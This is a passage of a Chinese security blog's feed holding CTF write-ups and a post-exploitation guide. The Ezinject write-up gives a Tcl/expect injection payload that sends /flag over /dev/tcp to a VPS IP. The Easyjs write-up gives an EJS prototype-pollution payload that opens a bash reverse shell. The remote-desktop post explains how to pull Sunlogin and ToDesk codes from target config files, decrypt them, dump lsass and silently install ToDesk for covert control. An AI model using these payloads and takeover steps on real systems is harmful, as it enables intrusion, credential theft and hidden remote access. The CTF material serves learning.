    <content type="html"><![CDATA[<p>环境都关了  自己搭个简陋的来测试</p><p>参考</p><p><a href="https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ">https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ</a></p><h2 id="Ezinject"><a href="#Ezinject" class="headerlink" title="Ezinject"></a>Ezinject</h2><p>./git泄露  githack下载源码下来</p><p><img src="../images/image-20240201160921186.png" alt="image-20240201160921186"></p><p>这就是个逻辑问题  tmd  当时困住了一会  session我们是无法进行修改的  那么我们就从其逻辑下手  先让ua为空报错  进入到catch中  使其loginOk不为null 为false  那么再次进入try的时候  我们就能直接进入到else中  使loginOk为True从而可以执行命令</p><p><img src="../images/image-20240201161142460.png" alt="image-20240201161142460"></p><p>这个command我们可控  重点就是讲这里了   他使用的expect命令来执行call.sh</p><p><img src="../images/image-20240201161234247.png" alt="image-20240201161234247"></p><p>使用的使tclsh来进行解析  和别的bash还是有点不同的 </p><p><img src="../images/image-20240201161326949.png" alt="image-20240201161326949"></p><p>password固定了 那么我们现在就剩这个 port和host还有dir可控了  因为在expect中执行命令需要system开头 那么port就被占用了  我们就剩host和dir了  我们本地进行演示一下 靠     <code>xx test -d xx</code>    能不能执行命令</p><p><img src="../images/image-20240201161801422.png" alt="image-20240201161801422"></p><p>这样是可以正常执行的  后面的参数对echo来说都是字符串</p><p><img src="../images/image-20240201162149384.png" alt="image-20240201162149384"></p><p>使用  `` 来当shell执行  这样是可以的 那么我们就构造好了</p><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">command=echo  [system &#x27;`cat&lt;/flag&gt;/dev/tcp/101.42.39.110/3389`&#x27;|bash]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat&lt;/flag和cat /flag的效果是一样的   这里我们将获取到的结果 &gt; 到vps上</span><br></pre></td></tr></table></figure><p>拼接到命令行中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval spawn ssh -p [system echo test -d &#x27;`cat&lt;/flag&gt;/dev/tcp/101.42.39.110/3389`&#x27;|bash]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240201162617758.png" alt="image-20240201162617758"></p><p><img src="../images/image-20240201162629032.png" alt="image-20240201162629032"></p><p>还有一种解法是使用tclsh的exec方法来执行</p><p><a href="https://boogipop.com/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Writeup/">https://boogipop.com/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Writeup/</a></p><h2 id="ezerp"><a href="#ezerp" class="headerlink" title="ezerp"></a>ezerp</h2><p><a href="https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ">https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ</a></p><p>看这篇文章来进行学习吧  主要是学习人家的思路  动调源码来分析  然后找到官方提供的制造插件的方法  然后伪造一个插件  然后在利用issue上的一个任意文件上传洞  上传恶意构造好的jar包  然后install就能RCE了</p><p>主要是学习人家的耐心和动调的思路</p><p><strong>(要是让我动调来做的话  估计没有耐心。。。。。。。。。。)</strong></p><p>文件上传的题少用bp  因为 <code>paste for file</code>会损坏文件内容</p><h2 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h2><p>这个题的话  CTF复现计划群里有docker  直接搭建就行</p><p><strong>(早知道当时来看这个题了  当时绑死在那个inject题那了  还没做出……………………….)</strong></p><p>用dirsearch扫或者直接看  <code>robots.txt</code>  都是能直接看到路由的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename</span><br><span class="line">upload</span><br><span class="line">list</span><br><span class="line">file</span><br></pre></td></tr></table></figure><p>一共是有这四个路由  </p><p><img src="../images/image-20240201183754102.png" alt="image-20240201183754102"></p><p>随便上传文件后  会返回uuid  等会我们就可以根据这个uuid来获取到我们上传的文件</p><p><img src="../images/image-20240201183932743.png" alt="image-20240201183932743"></p><p>漏洞点就在重命名处   存在路径穿越漏洞</p><p><img src="../images/image-20240201184354447.png" alt="image-20240201184354447"></p><p>重命名后</p><p><img src="../images/image-20240201184408115.png" alt="image-20240201184408115"></p><p>然后使用file来进行读取</p><p><img src="../images/image-20240201184420792.png" alt="image-20240201184420792"></p><p>这个就是sh文件的内容  <code>node /app/index.js</code>  然后再用相同的方法读取该文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;value&#125; = <span class="built_in">require</span>(<span class="string">&quot;lodash/seq&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">// 将文件信息存储到全局字典中</span></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">fileDictionary</span> = <span class="variable language_">global</span>.<span class="property">fileDictionary</span> || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>());</span><br><span class="line"><span class="comment">// 使用 body-parser 处理 POST 请求的数据</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"><span class="comment">// 设置模板的位置</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line"><span class="comment">// 设置模板引擎</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// 静态文件（CSS）目录</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/index&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//显示上传页面</span></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> file = req.<span class="property">files</span>.<span class="property">file</span>;</span><br><span class="line">    <span class="keyword">const</span> uniqueFileName = <span class="title function_">uuidv4</span>();</span><br><span class="line">    <span class="keyword">const</span> destinationPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, file.<span class="property">name</span>);</span><br><span class="line">    <span class="comment">// 将文件写入 uploads 目录</span></span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(destinationPath, file.<span class="property">data</span>);</span><br><span class="line">    <span class="variable language_">global</span>.<span class="property">fileDictionary</span>[uniqueFileName] = file.<span class="property">name</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(uniqueFileName);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// const keys = Object.keys(global.fileDictionary);</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/file&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">query</span>.<span class="property">uniqueFileName</span>)&#123;</span><br><span class="line">        uniqueFileName = req.<span class="property">query</span>.<span class="property">uniqueFileName</span></span><br><span class="line">        filName = <span class="variable language_">global</span>.<span class="property">fileDictionary</span>[uniqueFileName]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filName)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__dirname+<span class="string">&quot;/uploads/&quot;</span>+filName).<span class="title function_">toString</span>())</span><br><span class="line">            &#125;<span class="keyword">catch</span> (error)&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&quot;rename&quot;</span>)</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">oldFileName</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">newFileName</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">uuid</span>)&#123;</span><br><span class="line">        oldFileName = req.<span class="property">body</span>.<span class="property">oldFileName</span></span><br><span class="line">        newFileName = req.<span class="property">body</span>.<span class="property">newFileName</span></span><br><span class="line">        uuid = req.<span class="property">body</span>.<span class="property">uuid</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(oldFileName)  &amp;&amp; <span class="title function_">waf</span>(newFileName) &amp;&amp;  <span class="title function_">waf</span>(uuid))&#123;</span><br><span class="line">            uniqueFileName = <span class="title function_">findKeyByValue</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>,oldFileName)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> uuid);</span><br><span class="line">            <span class="keyword">if</span> (uniqueFileName == uuid)&#123;</span><br><span class="line">                <span class="title function_">putil_merge</span>(<span class="variable language_">global</span>.<span class="property">fileDictionary</span>,&#123;[uuid]:newFileName&#125;,&#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span>(newFileName.<span class="title function_">includes</span>(<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！！！&#x27;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    fs.<span class="title function_">rename</span>(__dirname+<span class="string">&quot;/uploads/&quot;</span>+oldFileName, __dirname+<span class="string">&quot;/uploads/&quot;</span>+newFileName, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                            res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名成功！&#x27;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;哒咩哒咩！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findKeyByValue</span>(<span class="params">obj, targetValue</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key) &amp;&amp; obj[key] === targetValue) &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果未找到匹配的键名，返回null或其他标识</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            data = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="title function_">includes</span>(<span class="string">&#x27;outputFunctionName&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;escape&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;delimiter&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;localsName&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置http</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;http://127.0.0.1:%s&quot;</span>, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240201184543074.png" alt="image-20240201184543074"></p><p><img src="../images/image-20240201184552402.png" alt="image-20240201184552402"></p><p>findKeyByValue这个函数存在原型链污染  然后题目还说是ejs  于是猜测是打ejs的原型链污染</p><p><a href="https://github.com/mde/ejs/issues/730">https://github.com/mde/ejs/issues/730</a></p><p>在ejs的issue里看到有5个paylaod   题目过滤了三个  那么我们直接挑<code>destructuredLocals</code>这个来打就行了</p><p><img src="../images/image-20240201184755545.png" alt="image-20240201184755545"></p><p>最终paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;oldFileName&quot;:&quot;a.txt&quot;,&quot;newFileName&quot;:&#123;&quot;__proto__&quot;:&#123; &quot;destructuredLocals&quot;:[&quot;__line=__line;global.process.mainModule.require(&#x27;child_proce ss&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;);//&quot;] &#125;&#125;,&quot;uuid&quot;:&quot;5769140e-b76b-419a-b590-9630f023bdd7&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240201185936210.png" alt="image-20240201185936210"></p><p>然后这样就能RCE了  这个环境可能有点问题  没弹上反正</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境都关了  自己搭个简陋的来测试&lt;/p&gt;
&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KiP3jU1WghdBXLMDpb3FJQ&quot;&gt;https://mp.weixin.qq.com/s/KiP3jU1WghdBXLM</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Windows-权限维持</title>
    <link href="https://ke1nys.github.io/posts/97ea5cd4.html"/>
    <id>https://ke1nys.github.io/posts/97ea5cd4.html</id>
    <published>2024-01-31T03:18:34.000Z</published>
    <updated>2024-02-24T13:59:43.424Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0446676abece824c755902fbd7d0260ba9517d33a3a9b199fa165c9ad6796c37"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>后渗透-远控RDP</title>
    <link href="https://ke1nys.github.io/posts/aae7bc59.html"/>
    <id>https://ke1nys.github.io/posts/aae7bc59.html</id>
    <published>2024-01-25T07:50:00.000Z</published>
    <updated>2024-02-24T13:59:43.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里主要就是介绍向日葵和toDesk   </p><p><a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a>    向日葵解密验证码工具</p><p><a href="https://github.com/RuoJi6/Deskbypass/tree/main">https://github.com/RuoJi6/Deskbypass/tree/main</a>    远控软件</p><p>查找进程命令  <code>tasklist | findstr ToDesk</code> </p><p>kill掉进程命令  <code>taskkill /f /pid 9908</code></p><p><strong>(这里用toDesk举例)</strong></p><h2 id="向日葵"><a href="#向日葵" class="headerlink" title="向日葵"></a>向日葵</h2><p>这里分为绿色版(SOS版)和安装版  如果目标机器上没有的话  可以尝试上传绿色版<strong>(可以免安装)</strong></p><p><img src="../images/image-20240125161118076.png" alt="image-20240125161118076"></p><p><img src="../images/image-20240125161011714.png" alt="image-20240125161011714"></p><p>对于高版本来说  配置文件里已经不包含识别码和验证码了   但是可以在注册表中查看</p><p>对于12.5.3以上的版本的话 全部都不通用了</p><p>但是对于高版本来说  有一招就是读内存的方法 就是读lsass文件  里面存着windows下的所有账号密码</p><p><img src="../images/image-20240125161836773.png" alt="image-20240125161836773"></p><p><img src="../images/image-20240125161856249.png" alt="image-20240125161856249"></p><p>这也是得需要system权限的</p><h3 id="向日葵绿色版"><a href="#向日葵绿色版" class="headerlink" title="向日葵绿色版"></a>向日葵绿色版</h3><p>可以免安装直接使用</p><p>但是这里的话得用管理员权限才行<strong>(SYSTEM)</strong>    不然会弹UAC</p><p><img src="../images/image-20240125155733304.png" alt="image-20240125155733304"></p><p>如果用管理员权限打开的话就不会出现这个问题</p><p><img src="../images/image-20240125155842299.png" alt="image-20240125155842299"></p><p>直接就可以运行了   </p><p>绿色版配置文件地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Oray\SunloginClientLite</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240125155946788.png" alt="image-20240125155946788"></p><p>关键的就是两个地方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">encry_pwd=gFjC7qBWrv0=                  这个是验证码</span><br><span class="line"></span><br><span class="line">fastcode=k534515981                      这个是识别码</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>验证码的话使用上面给的解密工具就行了</p><p><a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a></p><p><img src="../images/image-20240125160249720.png" alt="image-20240125160249720"></p><p>解密成功   然后进行登录</p><p><img src="../images/image-20240125160509206.png" alt="image-20240125160509206"></p><p>行了</p><h3 id="向日葵安装版"><a href="#向日葵安装版" class="headerlink" title="向日葵安装版"></a>向日葵安装版</h3><p>其实和上面差不多</p><p>如果目标主机没有   我们就选择上传绿色版</p><p>如果目标主机有 </p><ul><li>查看版本  配置文件是否有验证码和识别码</li><li>查看注册表</li><li>dump下来lsass文件  使用010来查看</li></ul><p>这就是针对目标机器上已经按照向日葵的方法</p><h2 id="toDesk"><a href="#toDesk" class="headerlink" title="toDesk"></a>toDesk</h2><p>todesk和向日葵一样  也是分为两个版本   就是绿色版和安装版  <strong>(均需要管理员权限运行  否者会报UAC)</strong></p><p>安装包还是在上面给的github里</p><h3 id="toDesk绿色版"><a href="#toDesk绿色版" class="headerlink" title="toDesk绿色版"></a>toDesk绿色版</h3><p>就是免装版  可以直接运行使用</p><p><img src="../images/image-20240126100729955.png" alt="image-20240126100729955"></p><p>他这个和向日葵的绿色版还不太一样  因为这个的话是可以直接最小化运行  不弹小窗出来   </p><p>我们去查看配置文件</p><p><code>C:\ProgramData\ToDesk_Lite\config.ini</code></p><p><img src="../images/image-20240126100846173.png" alt="image-20240126100846173"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clientld  这个是连接id</span><br><span class="line"></span><br><span class="line">tempauthpassex  是连接密码 </span><br><span class="line"></span><br><span class="line">//这个的话我们启动后  直接将tempauthpassex复制到本机上  然后重启就行了</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240126101052986.png" alt="image-20240126101052986"></p><p>然后重启本机的todesk</p><p><img src="../images/image-20240126101136619.png" alt="image-20240126101136619"></p><p><img src="../images/image-20240126101152690.png" alt="image-20240126101152690"></p><p>这样的话就能获取到靶机上的  连接密码了</p><p><img src="../images/image-20240126101325314.png" alt="image-20240126101325314"></p><p>连接成功</p><h3 id="toDesk安装版"><a href="#toDesk安装版" class="headerlink" title="toDesk安装版"></a>toDesk安装版</h3><p>这个的话还是用的上面github地址里的文件</p><p>这里是用的静默安装toDesk</p><p><img src="../images/image-20240126101609322.png" alt="image-20240126101609322"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ToDesk_4.5.0.2.exe /S </span><br></pre></td></tr></table></figure><p>主要就是<code>/S</code>这个参数   不会显示安装过程  但是会显示安装成功的弹窗</p><p>我们还是先去修改其teamauthpassex密码  免得到时候又得重启一遍</p><p><img src="../images/image-20240126101825293.png" alt="image-20240126101825293"></p><p>靶机的临时密码复制到攻击机上</p><p><img src="../images/image-20240126101954177.png" alt="image-20240126101954177"></p><p><img src="../images/image-20240126102008072.png" alt="image-20240126102008072"></p><p>进行登录</p><p><img src="../images/image-20240126102132278.png" alt="image-20240126102132278"></p><p>成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这里主要就是介绍向日葵和toDesk   &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/wafinfo/Sunfl</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe-K8s</title>
    <link href="https://ke1nys.github.io/posts/88e96dbc.html"/>
    <id>https://ke1nys.github.io/posts/88e96dbc.html</id>
    <published>2024-01-23T06:38:31.000Z</published>
    <updated>2024-02-24T13:59:43.423Z</updated>
    
